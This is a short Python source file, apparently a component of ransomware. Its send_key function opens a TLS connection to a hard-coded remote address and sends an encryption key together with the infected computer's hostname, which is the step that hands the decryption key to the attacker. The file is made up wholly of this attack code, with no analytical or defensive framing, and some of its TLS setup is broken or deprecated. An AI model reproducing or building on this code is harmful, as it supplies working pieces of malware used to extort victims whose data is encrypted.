# import :
import socket, ssl, platform

# Variables
HOST, PORT = '192.168.85.128', 4000
nom_ordi = platform.node()


def send_key(key):
    """
    Send the encrypt key to the remote server
    :param key -- encrypt key:
    """
    # Create and configure the SSL/TLS socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    context.options |= ssl.PROTOCOL_TLSv1_2

    # Create the SSL/TLS socket
    ssl_socket = ssl.wrap_socket(sock)

    # Connect to the remote server
    ssl_socket.connect((HOST, PORT))

    # Command for debugging, to remove later
    print(ssl_socket.cipher())

    # send the key and computer hostname
    ssl_socket.send(key)
    ssl_socket.send(nom_ordi.encode())

    # Close the connection with the remote server
    ssl_socket.close()
    sock.close()